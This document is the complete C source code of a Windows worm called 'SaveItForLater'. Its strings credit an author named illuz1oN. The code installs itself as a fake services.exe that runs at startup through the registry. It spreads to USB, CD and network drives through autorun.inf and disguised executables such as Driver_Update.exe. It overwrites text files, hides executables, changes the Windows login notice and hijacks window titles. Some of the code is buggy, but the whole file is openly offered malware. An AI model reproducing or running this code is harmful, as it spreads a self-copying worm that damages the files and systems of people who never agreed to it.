#include <windows.h>
#include <stdio.h>
#define IMSG "|__[__]__/=+-\\ SaveItForLater :] Worm By illuz1oN /-+=\\__[__]__|"
char me[1024];
HKEY hKey;
char *drives[] = {"C:","D:","E","F:","G:","H:","I:","J:","K:","L:",
                  "M:","N:","O:","P:","Q:","R:","S:","T:","U:","V:",
                  "W:","X:","Y:","Z:"};
DWORD WINAPI spreadUSB()
{
    while(1)
    {
        Sleep(120000);
        int i;
        for(i = 0;i < 24;i++)
        {
            if((GetDriveType(drives[i])) == DRIVE_REMOVABLE)
            {
                char hldPath[50];
                char usbFile[30] = "\\Driver_Update.exe";
                char autoRun[50] = "[autorun]\r\nopen=Driver_Update.exe";
                strcpy(hldPath,drives[i]);
                strcat(hldPath,"\\autorun.inf");
                FILE *fp = fopen("autorun.inf","w");
                fprintf(fp,autoRun);
                fclose(fp);
                CopyFile("autorun.inf",hldPath,0);
                remove("autorun.inf");
                strcat(drives[i],usbFile);
                CopyFile(me,drives[i],0);
            }
            else if((GetDriveType(drives[i])) == DRIVE_CDROM)
            {
                char cdPath[50];
                char cdFile[20] = "\\Worm_Pwn.exe";
                char cdAutr[50] = "[autorun]\r\nopen=Worm_Pwn.exe";
                strcpy(cdPath,drives[i]);
                strcat(cdPath,"\\autorun.inf");
                FILE *fpp = fopen("autorun.inf","w");
                fprintf(fpp,cdAutr);
                fclose(fpp);
                CopyFile("autorun.inf",cdPath,1);
                remove("autorun.inf");
                strcat(drives[i],cdFile);
                CopyFile(me,drives[i],0);
            }
            else if((GetDriveType(drives[i])) == DRIVE_REMOTE)
            {
                char remName[20] = "\\Upd_Config.exe";
                strcat(drives[i],remName);
                CopyFile(me,drives[i],0);
            }
        }
    }
}
BOOL Startup()
{
    char dropTo[1024];
    GetWindowsDirectory(dropTo,1024);
    strcat(dropTo,"\\services.exe");
    if((CopyFile(me,dropTo,1)) == 0)
        return 0;
    else
    {
        if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_SET_VALUE,&hKey) == ERROR_SUCCESS)
        {
            RegSetValueEx(hKey,"services",0,REG_SZ,(const unsigned char*)dropTo,strlen(dropTo));
            RegCloseKey(hKey);
        }
        return 1;
    }
}
DWORD WINAPI changeTitle(LPVOID lParam)
{
    while(1)
    {
        HWND hWnd = GetForegroundWindow();
        SetWindowText(hWnd,"|__[__]__/=+-\\ SaveItForLater :] Worm - illuz1oN /-+=\\__[__]__|");
    }
}
void winLogin(void)
{
    HKEY hKey;
    char szCaption[] = "          |__[__]__/=+-\\ illuz1oN /-+=\\__[__]__|";
    char szText[] = "             |__[__]__/=+-\\ SaveItForLater :] Worm By illuz1oN /-+=\\__[__]__|"
                    "\nIf you want to remove this worm, contact illuz1oN - illuz1oN@hotmail.co.uk"
                    "\n... AV Companies ~censored~ You ...";
    RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",0,KEY_SET_VALUE,&hKey);
    RegSetValueEx(hKey,"LegalNoticeCaption",0,REG_SZ,(const unsigned char*)szCaption,sizeof(szCaption));
    RegCloseKey(hKey);
    RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",0,KEY_SET_VALUE,&hKey);
    RegSetValueEx(hKey,"LegalNoticeText",0,REG_SZ,(const unsigned char*)szText,sizeof(szText));
    RegCloseKey(hKey);
}
int WINAPI WinMain (HINSTANCE hinst,HINSTANCE prhin,LPSTR argsx,int in)
{
    GetModuleFileName(0,me,1024);
    CreateMutex(0,0,"-+- illuz1oN -+-");
    if(GetLastError() == ERROR_ALREADY_EXISTS)
    {
        ExitProcess(0);
    }
    else
    {
        if((Startup()) == 0)
        {
         char szMask[4] = "*.*";
         DWORD ret = 0;
         WIN32_FIND_DATA fData;
         HANDLE hFind,hFile;
         hFind = FindFirstFile(szMask,&fData);
         if(fData.cFileName == "*.txt")
         {
            hFile = CreateFile(fData.cFileName,GENERIC_WRITE,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
            if(hFile == INVALID_HANDLE_VALUE)
               ExitProcess(0);
            else
            {
               WriteFile(hFile,IMSG,sizeof(IMSG),&ret,0);
               CloseHandle(hFile);
            }
         }
         else if(fData.cFileName == "*.exe")
         {
            SetFileAttributes(fData.cFileName,FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);
            CloseHandle(hFile);
         }            
         while (FindNextFile(hFind,&fData))
         {
            if(fData.cFileName == "*.txt")
            {
               hFile = CreateFile(fData.cFileName,GENERIC_WRITE,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
               if(hFile == INVALID_HANDLE_VALUE)
                  ExitProcess(0);
               else
               {
                  WriteFile(hFile,IMSG,sizeof(IMSG),&ret,0);
                  CloseHandle(hFile);
               }
            }        
            else if(fData.cFileName == "*.exe")
            {
               SetFileAttributes(fData.cFileName,FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);
               CloseHandle(hFile);
            }              
         }          
         FindClose(hFind);
        }
        else
        {
            winLogin();
            unsigned long title;
            CreateThread(0,0,changeTitle,0,0,&title);
            unsigned long virii;
            CreateThread(0,0,spreadUSB,0,0,&virii);
            Sleep(INFINITE);
        }
    }
}
